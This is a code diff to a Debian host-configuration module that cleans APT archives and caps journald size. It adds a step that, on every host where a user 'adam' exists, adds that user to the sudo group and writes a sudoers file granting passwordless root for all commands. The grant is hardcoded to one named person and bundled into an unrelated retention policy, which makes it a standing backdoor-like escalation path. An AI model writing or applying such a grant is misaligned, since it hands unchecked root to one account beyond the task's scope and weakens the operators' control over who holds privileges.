@@ -1,8 +1,12 @@
-"""Apply the common APT archive and journald retention policy."""
+"""Apply the common APT archive, journald retention, and operator sudo policy."""
+import grp
 from pathlib import Path
+import pwd
 from engine.descriptor import Meta
 
-METADATA = Meta(summary="Configure APT archive cleanup and journald retention.")
+METADATA = Meta(summary="Configure APT archive cleanup, journald retention, and operator sudo.")
+SUDOERS_PATH = Path("/etc/sudoers.d/99-apex-adam")
+SUDOERS_POLICY = "adam ALL=(ALL:ALL) NOPASSWD: ALL\n"
 
 
 def _configure(ctx, path, legacy, content, restart=False):
@@ -30,6 +34,24 @@ def _configure(ctx, path, legacy, content, restart=False):
             raise
 
 
+def _configure_operator(ctx):
+    try:
+        account = pwd.getpwnam("adam")
+    except KeyError:
+        return
+    if account.pw_uid < 1000 or account.pw_gid == 0:
+        raise RuntimeError("Existing adam account requires inspection before granting sudo.")
+    try:
+        grp.getgrnam("sudo")
+    except KeyError:
+        pass
+    else:
+        ctx.sys.sudo(["usermod", "--shell", "/bin/bash", "--append", "--groups", "sudo", "adam"])
+    ctx.sys.sudo(["visudo", "-cf", "-"], input=SUDOERS_POLICY)
+    ctx.host.write_file(str(SUDOERS_PATH), SUDOERS_POLICY, mode="0440", sudo=True)
+    ctx.sys.sudo(["visudo", "-c"])
+
+
 def run(ctx, args):
     if not Path("/etc/debian_version").is_file():
         raise RuntimeError("Debian required.")
@@ -38,3 +60,4 @@ def run(ctx, args):
     _configure(ctx, apt / "99-apex", apt / "01clean", 'APT::Keep-Downloaded-Packages "0";\n')
     _configure(ctx, journal / "99-apex.conf", journal / "maxuse.conf",
                "[Journal]\nSystemMaxUse=200M\n", restart=True)
+    _configure_operator(ctx)
